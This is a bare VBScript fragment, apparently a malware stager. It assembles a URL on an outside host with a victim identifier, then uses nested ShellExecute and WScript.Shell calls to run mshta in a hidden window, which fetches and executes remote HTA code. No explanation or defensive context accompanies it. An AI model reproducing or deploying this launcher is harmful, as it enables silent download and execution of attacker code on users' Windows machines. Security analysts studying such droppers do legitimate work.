script = "'https://ecs.rcsis.ir/?uid=" + uid + "&s=2'"
action = """javascript:close((new ActiveXObject('Shell.Application')).ShellExecute('mshta'," + script + ", '', 'open', 0))"""
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run  "mshta " + action, 0, False
